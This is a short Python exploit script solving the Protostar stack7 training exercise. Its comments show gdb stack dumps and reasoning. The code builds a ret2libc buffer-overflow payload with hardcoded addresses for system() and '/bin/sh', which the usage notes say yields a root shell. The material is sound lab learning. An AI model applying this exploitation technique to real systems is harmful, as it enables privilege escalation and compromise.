# Author	 : Abhinav Thakur
# E-Mail	 : compilepeace@gmail.com
# Platform	 : exploit-exercises/protostar/stack7
# ScriptName : exploit_stack7.py
#
# Usage 	 : While in protostar VM /home/ directory, type the bellow commands
#			   		$ python exploit_stack7.py > input_file
#			   		$ cat input_file - | /opt/protostar/bin/stack7
#					whoami
#					root
#
	
# In getpath() : buffer is at 0xbffff75c
#                ebp is at 0xbffff7a8
#                return pointer is at 0xbffff7ac

# In main()    : ebp is at 0xbffff7b8
#                return pointer is at 0xbffff7bc

# Stack layout is shown bellow with 0x41('A') as our buffer input -

#0xbffff750:     0x00000000      0x00000001      0xb7fff8f8      0x41414141
#0xbffff760:     0x41414141      0x41414141      0x41414141      0x41414141
#0xbffff770:     0x41414141      0x41414141      0x41414141      0x41414141
#0xbffff780:     0x41414141      0x41414141      0x41414141      0x41414141
#0xbffff790:     0x41414141      0x41414141      0x41414141      0x08048550
#0xbffff7a0:     0xb7ec6365      0xb7ff1040      0xbffff7b8      0x08048550
#0xbffff7b0:     0x08048570      0x00000000      0xbffff838      0xb7eadc76
#0xbffff7c0:     0x00000001      0xbffff864      0xbffff86c      0xb7fe1848


# since we cannot modify getpath()'s return address to anything starting with
# '0xb', what I can think of doing is one of the 2 -
#       > Overwrite the getpath()'s return pointer to point to main()'s return
#         pointer which will contain address of some place in stack where our
#         arbitary code will be placed.
#       > Overwrite the getpath()'s return pointer to return to libc


# (gdb) p system
#$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>


import struct

buffer = "\x41"*80
getpath_saved_eip = struct.pack("I", 0x08048544)
system_addr = struct.pack("I", 0xb7ecffb0)
ret_to = "\x41\x41\x41\x41"
bin_sh_string_addr = struct.pack("I", 0xb7fb63bf)

payload = buffer + getpath_saved_eip + system_addr + ret_to + bin_sh_string_addr


print payload

